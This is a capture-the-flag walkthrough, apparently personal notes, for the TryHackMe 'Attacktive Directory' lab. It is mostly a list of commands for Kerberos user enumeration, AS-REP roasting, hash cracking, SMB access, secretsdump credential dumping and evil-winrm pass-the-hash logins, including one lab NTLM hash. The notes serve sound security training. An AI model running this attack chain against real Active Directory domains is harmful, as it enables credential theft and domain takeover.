<div align="center">
                  
# [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
![image](https://user-images.githubusercontent.com/51442719/177435882-34e6b079-d835-4ae0-9e97-6b39078e0c16.png)

</div>

- [x] Task 1  [`Intro` Deploy The Machine]()
- [x] Task 2  [`Intro` Setup]()
- [x] Task 3  [`Enumeration` Welcome to Attacktive Directory]()
- [x] Task 4  [`Enumeration` Enumerating Users via Kerberos]()
- [x] Task 5  [`Exploitation` Abusing Kerberos]()
- [x] Task 6  [`Enumeration` Back to the Basics]()
- [x] Task 7  [`Domain Privilege Escalation` Elevating Privileges within the Domain]()
- [ ] Task 8  [`Flag Submission` Flag Submission Panel]()

---


---

- ## Task 1  [`Intro` Deploy The Machine]()

---

- ## Task 2  [`Intro` Setup]()

---

- ## Task 3  [`Enumeration` Welcome to Attacktive Directory]()

---

- ## Task 4  [`Enumeration` Enumerating Users via Kerberos]()

---

- ## Task 5  [`Exploitation` Abusing Kerberos]()

---

- ## Task 6  [`Enumeration` Back to the Basics]()

---

- ## Task 7  [`Domain Privilege Escalation` Elevating Privileges within the Domain]()

---

- ## Task 8  [`Flag Submission` Flag Submission Panel]()

---

# Commands Used:

## Enumeration
```bash
nmap -p- -A -nP $IP
```

## DNS domain name and add it to `/etc/hosts`
```bash
echo $IP spookysec.local >> /etc/hosts
```

```bash
enum4linux -a spookysec.local
```

```bash
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100
```

```bash
find / -type f -name 'GetNPUsers.py'
```

## Exploiting Kerberos
```bash
impacket-GetNPUsers spookysec.local/svc-admin -no-pass
or
impacket-GetNPUsers -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
```

```bash
smbclient -L \\\\$IP\\ -U 'svc-admin' -P 'm********t2005'
```

```bash
john kerbhash --wordlist=/passwords.txt
or
hashcat -a 0 -m 18200 kerbhash password.txt --force

```

```bash
smbmap -H spookysec.local -d spookysec.local -u svc-admin -p m********t2005
```

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
```

```bash
cd evil-winrm 
gem install evil-winrm
```

```bash
evil-winrm -i $IP -u Administrator -H e48xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

```bash
impacket-secretsdump -dc-ip spookysec.local backup@spookysec.local
```

```bash 
evil-winrm -i 10.10.102.138 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```


---

- https://fr33s0ul.tech/attacktive-directory-thm-write-up/

# [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)
